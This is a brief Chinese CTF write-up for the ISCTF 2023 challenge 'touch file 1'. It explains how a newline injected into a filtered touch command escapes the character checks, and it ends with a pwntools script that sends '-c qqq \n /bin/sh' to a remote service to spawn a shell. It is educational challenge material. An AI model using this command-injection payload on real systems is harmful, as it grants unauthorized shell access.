---
title: isctf2023 - touch file 1
date: 2023/12/4 12:00:00
tags:
    - shell jail
excerpt: 通过命令注入利用换行符成功获取shell。
---

## 文件分析

保护全开  
ghidra分析为64位程序

## 解题思路

考察命令注入，进入touch后存在字符检查，把大部分字符都ban了，
但是想到平时输命令都是按回车执行的，那么利用换行能不能结束touch命令呢？

给新手提个醒，read函数虽然是按'\n'截断输入的，但是将'\n'包含在payload中发送过去时，
只要不是最后一个字符，就不会被截断

测试一下，成功拿到shell

## EXPLOIT

```python
from pwn import *
sh = remote('43.249.195.138', 20440)
sh.sendline(b'1')

sh.sendline(b'-c qqq \n /bin/sh')

sh.interactive()
```

Done.